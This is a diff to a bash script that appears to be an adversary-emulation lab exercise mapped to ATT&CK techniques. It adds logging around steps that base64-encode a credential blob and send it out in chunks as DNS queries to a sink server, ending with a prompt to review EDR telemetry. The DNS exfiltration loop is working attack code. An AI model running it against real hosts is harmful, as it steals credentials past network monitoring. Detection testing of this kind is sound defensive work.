@@ -66,6 +66,7 @@ fi
 
 # --- Step 3: Collection / staging -----------------------------------------
 step "Step 3: Collection — base64-encode the blob (ATT&CK T1560.001)"
+act T1560.001 "base64 -w0 | tr (encode credential blob)" "$LAB_NODE" "$RAW"
 B64="$(base64 -w0 "$RAW" | tr '+/' '-_' | tr -d '=')"   # url-safe, DNS-label friendly
 say "encoded payload length: ${#B64} chars"
 
@@ -81,6 +82,7 @@ seq=0
 for ((i=0; i<${#B64}; i+=CHUNK)); do
     label="${B64:i:CHUNK}"
     qname="${seq}.${SESSION}.${label}.${EXFIL_DOMAIN}"
+    act T1048.003 "dig +short @${DNS_SINK} A" "$DNS_SINK" "$qname"
     dig +short +tries=1 +time=2 @"$SINK_IP" "$qname" A >/dev/null 2>&1 \
         && say "  exfil seq=$seq ($label)" \
         || say "  exfil seq=$seq FAILED ($qname)"
@@ -91,3 +93,5 @@ st_mark T1048.003 "dns-exfil-done"
 
 step "Done — ${seq} DNS exfil queries sent. Review EDR/alerting telemetry."
 say "artifacts: $LOG  $RAW  (decoded copy appears in sink's results as exfil_${SESSION}.decoded)"
+
+act_summary
